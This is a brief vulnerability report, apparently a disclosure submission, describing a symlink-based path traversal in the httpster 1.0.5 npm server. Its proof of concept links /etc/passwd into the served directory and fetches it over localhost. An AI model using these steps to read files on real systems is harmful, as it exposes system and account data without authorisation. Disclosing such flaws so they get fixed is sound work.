# Description

I would like to report a Path Traversal vulnerability in the httpster module. It allows an attacker to read system files via a Path Traversal vulnerability. With a symbolically linked file in the working directory, it is possible to read arbitrary files outside of the web root directory.

# Module

Module name: httpster
Version: 1.0.5 (latest)

# Module Description

Simple http server for quick loading of content.

# PoC

1) Install the httpster module
`$ npm -g install httpster`

2) Make a directory
`$ mkdir test`

3) Go to 'test' directory
`$ cd test`

4) Create a symlink file
`ln -s /etc/passwd 'filename'`

5) Run httpster module
`$ httpster`

6) Request the file within browser
`http://localhost:3333/'filename'`

# Impact

This could have enabled an attacker to view system files and leverage attacks like remote code execution.
